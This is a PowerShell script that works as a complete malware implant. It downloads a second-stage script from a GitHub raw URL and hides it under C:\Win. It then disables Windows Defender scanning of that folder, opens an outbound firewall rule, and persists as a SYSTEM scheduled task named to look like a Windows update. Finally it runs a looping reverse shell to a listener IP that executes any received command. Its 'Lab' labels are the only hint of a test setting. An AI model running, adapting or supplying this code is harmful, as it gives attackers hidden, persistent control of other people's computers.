# --- CONFIGURATION ---
$LHOST = "192.168.1.129" # Your listener IP
$LPORT = 4444          # Your listener Port
$WorkDir = "C:\Win"
$ScriptName = "service.ps1"
$FullPath = Join-Path $WorkDir $ScriptName
$TaskName = "WinUpdateMaintenance"
$RemoteUrl = "https://raw.githubusercontent.com/mynahtrium/bug-free-enigma/refs/heads/main/winstart.ps1"
# ---------------------

# 1. SETUP & INSTALLATION
if (-not (Test-Path $WorkDir)) {
    New-Item -Path $WorkDir -ItemType Directory -Force | Out-Null
}

# Detection: If we aren't running the specific file in C:\Win, we install and hand off
if ($PSCommandPath -ne ${FullPath}) {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($RemoteUrl, ${FullPath})
        
        attrib +h +s ${FullPath}

        # Launch background process silently
        $ProcArgs = '-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + ${FullPath} + '"'
        Start-Process powershell.exe -ArgumentList $ProcArgs
        
        # Kill loader session to prevent terminal hang
        Stop-Process -Id $PID 
    } catch {
        # Silent failure
    }
}

# 2. SYSTEM MODIFICATIONS (Requires Admin)
try {
    Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue
    
    if (-not (Get-NetFirewallRule -DisplayName "Lab Management Outbound" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName "Lab Management Outbound" -Direction Outbound -LocalPort $LPORT -Protocol TCP -Action Allow -ErrorAction SilentlyContinue
    }
} catch {
    # Proceed without admin-level mods
}

# 3. PERSISTENCE
try {
    if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
        $Arg = '-WindowStyle Hidden -ExecutionPolicy Bypass -File "' + ${FullPath} + '"'
        
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $Arg
        $Trigger = New-ScheduledTaskTrigger -AtStartup
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
    }
} catch {
    # Silent failure
}

# 4. THE ENGINE (The Reverse Shell)
while ($true) {
    $client = $null
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
        $writer.WriteLine("--- Identity: $(whoami) ---")
        
        while ($client.Connected) {
            $writer.Write("PS " + (Get-Location).Path + "> ")
            
            $command = $reader.ReadLine()
            
            if ($null -eq $command) { 
                break 
            }
            
            $command = $command.Trim()
            if ($command -eq "exit") { break }
            if ($command -eq "") { continue }

            $output = try {
                Invoke-Expression $command 2>&1 | Out-String
            } catch {
                "Error: " + $_.Exception.Message
            }

            if ([string]::IsNullOrWhiteSpace($output)) { $output = "`n" }
            $writer.Write($output)
        }
    } catch {
        # Wait 10 seconds before retrying connection
        Start-Sleep -Seconds 10
    } finally {
        if ($null -ne $client) { $client.Close() }
        if ($null -ne $reader) { $reader.Close() }
        if ($null -ne $writer) { $writer.Close() }
    }
}
